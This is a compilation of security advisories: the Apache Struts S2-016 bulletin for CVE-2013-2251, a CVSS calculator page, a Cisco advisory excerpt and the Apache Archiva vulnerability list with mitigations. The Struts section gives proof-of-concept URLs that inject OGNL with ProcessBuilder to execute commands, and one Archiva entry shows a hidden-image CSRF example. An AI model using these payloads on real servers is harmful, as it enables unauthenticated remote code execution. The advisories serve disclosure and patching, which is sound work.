## Summary

| Who should read this | All Struts 2 developers and users |
| --- | --- |
| Impact of vulnerability | Remote command execution |
| Maximum security rating | Critical |
| Recommendation | Developers should immediately upgrade to [Struts 2.3.15.1](http://struts.apache.org/download.cgi#struts23151) |
| Affected Software | Struts 2.0.0 - Struts 2.3.15 |
| Reporter | Takeshi Terada of Mitsui Bussan Secure Directions, Inc. |
| CVE Identifier | [CVE-2013-2251](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2251) |

## Problem

The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with "action:" or "redirect:", followed by a desired navigational target expression. This mechanism was intended to help with attaching navigational information to buttons within forms.

In Struts 2 before 2.3.15.1 the information following "action:", "redirect:" or "redirectAction:" is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.

## Proof of concept

In the Struts Blank App, open following URLs.

1. Simple Expression - the parameter names are evaluated as OGNL.
   1. ```
      http://host/struts2-blank/example/X.action?action:%25{3*4}
      ```
   2. ```
      http://host/struts2-showcase/employee/save.action?redirect:%25{3*4}
      ```

1. Command Execution
   1. ```
      http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}
      ```
   2. ```
      http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}
      ```
   3. ```
      http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}
      ```

## Solution

DefaultActionMapper was changed to sanitize "action:"-prefixed information properly. The features involved with "redirect:"/"redirectAction:"-prefixed parameters were completely dropped - see also [S2-017](/confluence/display/WW/S2-017).

**It is strongly recommended to upgrade to** **[Struts 2.3.15.1](http://struts.apache.org/download.cgi#struts23151)****, which contains the corrected Struts2-Core library.**

# Common Vulnerability Scoring System

| Choose the version of CVSS calculator:   Version 1  Version 2  Version 3  Version 3.1 |
| --- |
| Common Vulnerability Scoring System (CVSS) Online Calculator, version 2.0 |
| Vector: AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C/CDP:ND/TD:ND/CR:ND/IR:ND/AR:ND |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Access Vector AV: Local AV: Adjacent Network AV: Network  Access Complexity AC: High AC: Medium AC: Low  Authentication Au: Multiple Au: Single Au: None  Confidentiality Impact C: None C: Partial C: Complete  Integrity Impact I: None I: Partial I: Complete  Availability Impact A: None A: Partial A: Complete     Base Score: 10.0 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploitability E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   **Exploitability**  ---   Unproven (U) No exploit code is available, or an exploit is entirely theoretical. Proof-of-Concept (POC) Proof-of-concept exploit code or an attack demonstration that is not practical for most systems is available. The code or technique is not functional in all situations and may require substantial modification by a skilled attacker.  Functional (F) Functional exploit code is available. The code works in most situations where the vulnerability exists.  High (H) Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available. The code works in every situation, or is actively being delivered via a mobile autonomous agent (such as a worm or virus).  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   **Remediation Level**  ---   Official Fix (OF)  A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available. Temporary Fix (TF) There is an official but temporary fix available. This includes instances where the vendor issues a temporary hotfix, tool, or workaround.  Workaround (W)  There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.  Unavailable (U)  There is either no solution available or it is impossible to apply.  Not Defined (ND)  Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Report Confidence RC: Unconfirmed  RC: Uncorroborated  RC: Confirmed  RC: Not Defined   **Report Confidence**  ---   Unconfirmed (UC) There is a single unconfirmed source or possibly multiple conflicting reports. There is little confidence in the validity of the reports. An example is a rumor that surfaces from the hacker underground. Uncorroborated (UR) There are multiple non-official sources, possibly including independent security companies or research organizations. At this point there may be conflicting technical details or some other lingering ambiguity.  Confirmed (C) The vulnerability has been acknowledged by the vendor or author of the affected technology. The vulnerability may also be ?Confirmed? when its existence is confirmed from an external event such as publication of functional or proof-of-concept exploit code or widespread exploitation.  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.     Temporal Score: 8.3 |

| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Collateral Damage Potential CDP: None  CDP: Low  CDP: Low-Medium  CDP: Medium-High  CDP: High  CDP: Not Defined   Target Distribution TD: None  TD: Low  TD: Medium  TD: High  TD: Not Defined   Confidentiality Requirement CR: Not Defined  CR: Low  CR: Medium  CR: High   Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Availability Requirement AR: Not Defined  AR: Low  AR: Medium  AR: High      Environmental Score: 8.3 |

Details  * A vulnerability in the *DefaultActionMapper* component could allow an unauthenticated, remote attacker to execute arbitrary commands on the targeted system.      The vulnerability is due to insufficient sanitization of user-supplied input. An attacker could exploit this vulnerability by sending crafted requests consisting of Object-Graph Navigation Language (OGNL) expressions. An exploit could allow the attacker to execute arbitrary code on the targeted system.      The impact of this vulnerability on Cisco products varies   depending on the affected product. Successful exploitation on Cisco ISE,   Cisco Unified SIP Proxy, and Cisco Business Edition 3000 could result in   an arbitrary command executed on the affected system. There is no   authentication needed to execute the attack on Cisco ISE, Cisco   Unified SIP Proxy and Cisco Unified CCE or Cisco PCCE. To exploit this vulnerability on Cisco Business   Edition 3000, the attacker must provide valid   credentials or persuade a user with valid credentials to execute a   malicious URL.      Successful exploitation on the Cisco MXE 3500 Series could allow the   attacker to redirect the user to a different and possibly malicious website; however, arbitrary   command execution is not possible on this product.      See the "Vulnerability Scoring Details" section of this security advisory for additional information regarding the attack vector and impact.      This vulnerability is documented in Cisco bug IDs [CSCui22841](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCui22841) ([registered](https://sec.cloudapps.cisco.comRPF/register/register.do) customers only) for Cisco ISE, [CSCui33268](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCui33268) ([registered](https://sec.cloudapps.cisco.comRPF/register/register.do) customers only) for Cisco Business Edition 3000, [CSCui40582](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCui40582) ([registered](https://sec.cloudapps.cisco.comRPF/register/register.do) customers only) for Cisco Unified SIP Proxy and [CSCui48757](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCui48757) ([registered](https://sec.cloudapps.cisco.comRPF/register/register.do) customers only) for Cisco MXE 3500 Series, and [CSCui51516](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCui51516) ([registered](https://sec.cloudapps.cisco.comRPF/register/register.do) customers only) for Cisco Unified CCE and Cisco PCCE.

### CVE-2023-28158: Privilege escalation via stored XSS

Privilege escalation via stored XSS using the file upload service to upload malicious content. The issue can be exploited only by authenticated users which can create directory name to inject some XSS content and gain some privileges such admin user.

### CVE-2022-29405: Apache Archiva Arbitrary user password reset vulnerability

### CVE-2021-45105: Apache Log4j2 does not always protect from infinite recursion in lookup evaluation

This may be used by attackers, if users changed the default Archiva log4j2.xml configuration.

### CVE-2021-45046: Apache log4j2 Thread Context Lookup Pattern vulnerable to remote code execution in certain non-default configurations

This may be used by attackers, if users changed the default Archiva log4j2.xml configuration.

### CVE-2021-44228: Apache log4j2 is vulnerable to remote code execution

As mentioned in this CVE Apache log4j2 libraries are vulnerable to remote code execution. Archiva is using log4j2 libraries and is therefore vulnerable to the same scenarios mentioned in this CVE. Attackers may be able to inject statements into the HTTP requests which may be interpreted by the logging library and lead to the download of arbitrary code from remote servers.

### CVE-2020-9495: Apache Archiva login service is vulnerable to LDAP injection

By providing special values to the archiva login form a attacker is able to retrieve user attribute data from the connected LDAP server. With certain characters it is possible to modify the LDAP filter used to query the users on the connected LDAP server. By measuring the response time, arbitrary attribute data can be retrieved from LDAP user objects.

Versions Affected:

* All versions before 2.2.5

Mitigation:

* Upgrade to  [Archiva 2.2.5 or higher](./download.cgi)
### CVE-2019-0213: Apache Archiva XSS may be stored in central UI configuration

It may be possible to store malicious XSS code into central configuration entries, i.e. the logo URL. The vulnerability is considered as minor risk, as only users with admin role can change the configuration, or the communication between the browser and the Archiva server must be compromised.

Versions Affected:

* All versions before 2.2.4

Mitigation:

* Upgrade to  [Archiva 2.2.4 or higher](./download.cgi)
* Make sure, that communication between Archiva server and browser is secure by using TLS and only certain users are assigned to admin role.
### CVE-2019-0214: Apache Archiva arbitrary file write and delete on the server

It is possible to write files to the archiva server at arbitrary locations by using the artifact upload mechanism. Existing files can be overwritten, if the archiva run user has appropriate permission on the filesystem for the target file.

Versions Affected:

* All versions before 2.2.4

Mitigation:

* It is highly recommended to upgrade to  [Archiva 2.2.4 or higher](./download.cgi), where additional validations are implemented to prevent such malicious parameter values.
* As intermediate action you may reduce the number of users that are allowed to upload to archiva and make sure, that the archiva run user may have only write permission to the directories needed.
### CVE-2017-5657: Apache Archiva CSRF vulnerabilities for various REST endpoints

Several REST service endpoints of Apache Archiva are not protected against CSRF attacks. A malicious site opened in the same browser as the archiva site, may send HTML response that performs arbitrary actions on archiva services, with the same rights as the active archiva session (e.g. adminstrator rights).

Versions Affected:

* All versions before 2.2.3

Mitigation:

* Upgrade to  [Archiva 2.2.3 or higher](./download.html), where additional measures are taken to verify the origin of REST requests.
### CVE-2013-2251: Apache Archiva Remote Command Execution

Apache Archiva is affected by a vulnerability in the version of the Struts library being used, which allows a malicious user to run code on the server remotely. More details about the vulnerability can be found at <http://struts.apache.org/release/2.3.x/docs/s2-016.html>.

Versions Affected:

* Archiva 1.3 to Archiva 1.3.6

* The unsupported versions Archiva 1.2 to 1.2.2 are also affected.

All users are recommended to upgrade to  [Archiva 2.0.1 or Archiva 1.3.8](./download.cgi), which are not affected by this issue.

Archiva 2.0.0 and later is not affected by this issue.

### CVE-2013-2187: Apache Archiva Cross-Site Scripting vulnerability

A request that included a specially crafted request parameter could be used to inject arbitrary HTML or Javascript into the Archiva home page.

Versions Affected:

* Archiva 1.3 to Archiva 1.3.6

* The unsupported versions Archiva 1.2 to 1.2.2 are also affected.

All users are recommended to upgrade to  [Archiva 2.0.1 or Archiva 1.3.8](./download.cgi), which are not affected by this issue.

Archiva 2.0.0 and later is not affected by this issue.

### CVE-2010-1870: Struts2 remote commands execution

Apache Archiva is affected by a vulnerability in the version of the Struts library being used, which allows a malicious user to run code on the server remotely. More details about the vulnerability can be found at <http://struts.apache.org/2.2.1/docs/s2-005.html>.

Versions Affected:

* Archiva 1.3 to Archiva 1.3.5

* The unsupported versions Archiva 1.2 to 1.2.2 are also affected.

All users are recommended to upgrade to  [Archiva 1.3.6](./download.cgi), which configures Struts in such a way that it is not affected by this issue.

Archiva 1.4-M3 and later is not affected by this issue.

### CVE-2011-1077: Multiple XSS issues

Apache Archiva is vulnerable to multiple XSS issues, both stored (persistent) and reflected (non-persistent). Javascript which might contain malicious code can be appended in a request parameter or stored as a value in a submitted form, and get executed.

Versions Affected:

* Archiva 1.3 to 1.3.4
* The unsupported versions Archiva 1.0 to 1.2.2 are also affected.
### CVE-2011-1026: Multiple CSRF issues

An attacker can build a simple html page containing a hidden Image tag (eg: `<img src=vulnurl width=0 height=0 /`>) and entice the administrator to access the page.

Versions Affected:

* Archiva 1.3 to 1.3.4
* The unsupported versions Archiva 1.0 to 1.2.2 are also affected.
### CVE-2011-0533: Apache Archiva cross-site scripting vulnerability

A request that included a specially crafted request parameter could be used to inject arbitrary HTML or Javascript into the Archiva user management page. This fix is available in version  [1.3.4](./download.html) of Apache Archiva. All users must upgrade to this version (or higher).

Versions Affected:

* Archiva 1.3 to 1.3.3
* The unsupported versions Archiva 1.0 to 1.2.2 are also affected.
### CVE-2010-3449: Apache Archiva CSRF Vulnerability

Apache Archiva doesn't check which form sends credentials. An attacker can create a specially crafted page and force archiva administrators to view it and change their credentials. To fix this, a referrer check was added to the security interceptor for all secured actions. A prompt for the administrator's password when changing a user account was also set in place. This fix is available in version  [1.3.2](./download.html) of Apache Archiva. All users must upgrade to this version (or higher).

Versions Affected:

* Archiva 1.3 to 1.3.1
* Archiva 1.2 to 1.2.2 (end of life)
* Archiva 1.1 to 1.1.4 (end of life)
* Archiva 1.0 to 1.0.3 (end of life)

Apache Archiva use Apache Struts2:

```
 "In Struts 2 before 2.3.15.1 the information following "action:",
"redirect:" or "redirectAction:" is not properly sanitized. Since said
information will be evaluated as OGNL expression against the value stack,
this introduces the possibility to inject server side code."
```

<http://struts.apache.org/release/2.3.x/docs/s2-016.html>

^ All that is CVE-2013-2251.
